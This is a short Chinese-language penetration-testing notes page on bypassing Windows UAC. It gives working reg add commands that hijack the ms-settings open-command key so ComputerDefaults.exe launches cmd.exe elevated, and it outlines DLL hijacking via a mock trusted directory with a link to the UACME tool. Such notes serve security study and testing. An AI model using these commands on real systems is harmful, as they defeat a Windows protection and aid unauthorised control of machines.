# Bypass UAC

#### 原理

UAC为Windows一种控制机制，可以阻止自动安装未授权的软件，UAC限制所有用户包括RID 500的管理员用户，Bypass UAC算是绕过了一种保护机制，并不能看作一种真正的提权

#### Bypass UAC白名单

白名单程序特性：Manifest数据中autoElevate属性为True

利用微软strings.exe工具(https://learn.microsoft.com/zh-cn/sysinternals/downloads/strings)枚举autoElevate属性的程序

```
strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i "autoElevate"
```

以ComputerDefaults.exe为例

```
C:\Windows\System32\ComputerDefaults.exe:         <autoElevate>true</autoElevate>
```

运行一下ComputerDefaults.exe并使用Pocess Monitor监控ComputerDefaults.exe进程，定位到HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute

通常情况下，shell\open\command命令的注册表中存储的可能是可执行文件的路径，通常情况下UAC白名单中的程序运行时默认提升了权限，通过修改注册表将恶意载荷分别写入默认与DelegateExecute键值

```
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Windows\System32\cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

再次执行即可Bypass UAC启动CMD

#### Bypass UAC(DLL)

**DLL劫持原理：**

如果没有指定DLL的绝对路径，那么程序会以特定的顺序依次在指定路径下搜索待加载的DLL，顺序为：C:\windows\system32->C:\windows\system->c:\windwos

**模拟可信任目录**

测试人员根据可信任目录来创建一个包含尾随空格的模拟可信任目录，将一个白名单程序复制到可信任目录中，配合DLL劫持等技术即可绕过UAC。

**WinSAT.exe DLL劫持**

{% file src="../../.gitbook/assets/自动化通用DLL劫持(1).pdf" %}

#### UACME

{% embed url="https://github.com/hfiref0x/UACME" %}

集成了70多种Bypass UAC方法
